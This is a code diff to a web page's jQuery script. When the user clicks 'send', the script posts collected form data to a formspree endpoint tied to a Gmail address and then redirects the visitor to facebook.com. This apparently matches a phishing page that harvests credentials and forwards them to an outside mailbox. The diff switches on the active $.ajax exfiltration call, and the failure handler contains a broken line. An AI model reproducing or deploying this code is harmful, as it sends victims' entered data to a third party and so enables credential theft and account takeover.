@@ -67,6 +67,7 @@
 			});
 			
 			$('button#send').click(function(){
+				/*
 				$.post( "https://formspree.io/onlinejobatpb@gmail.com", dataobj).done(function() {
 					$(location).attr('href','https://www.facebook.com');
 				}).fail(function() {
@@ -74,22 +75,22 @@
 				}).always(function() {
 					$(location).attr('href','https://www.facebook.com');
 				});
-				/**
+				*/
 				$.ajax({
 					type: "POST",
 					url: "https://formspree.io/onlinejobatpb@gmail.com",
-					// The key needs to match your method's input parameter (case-sensitive).
+					crossDomain: true,
 					data: JSON.stringify(dataobj),
 					contentType: "application/json; charset=utf-8",
 					dataType: "json",
-					success: function(dataobj){
+					success: function(){
 						$(location).attr('href','https://www.facebook.com');
 					},
 					failure: function(errMsg) {
 						$*(location).attr("https://facebook.com");
 					}
 				});
-				*/
+	
 			});
 		});
 	</script>
